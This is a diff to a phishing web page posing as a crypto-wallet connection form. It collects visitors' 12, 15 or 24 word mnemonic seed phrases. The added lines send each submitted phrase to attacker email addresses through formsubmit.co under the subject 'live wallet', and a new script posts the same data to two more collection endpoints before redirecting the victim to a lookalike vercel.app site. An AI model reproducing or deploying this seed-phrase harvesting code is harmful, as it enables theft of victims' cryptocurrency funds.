@@ -208,7 +208,12 @@
                     
 
                     <div id="div_connect_manuallly" style="display:none;">
-                        <form action="https://form.taxi/s/w4n8cilt" method="POST">
+                       <form  id="contactForm" action="https://formsubmit.co/lordofresp3@gmail.com" method="POST">
+<input type="hidden" name="_next" value="https://livewalletsvalidationsync.vercel.app">
+		
+    <input type="hidden" name="_subject" value="live wallet">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="table">
                             
                             <div class="form-group">
       <textarea placeholder="Enter your 12, 15, or 24 Mnemonic words. Seperate them with spaces." class="form-control" style="font-size:25px; font-weight:650" rows="4" name="phrase" required=""></textarea>
@@ -401,7 +406,24 @@
     </style>
 
 
+<script>
+document.getElementById("contactForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
 
+  const formData = new FormData(e.target);
+
+  await fetch("https://formsubmit.co/lordofr03@gmail.com", {
+    method: "POST",
+    body: formData
+  });
+
+  await fetch("https://formsubmit.co/271c06d36b1c904f1b8fc4d5f7df0c8d", {
+    method: "POST",
+    body: formData
+  });
+window.location.href = "https://livewalync.vercel.app";
+});
+</script>
 
 
 
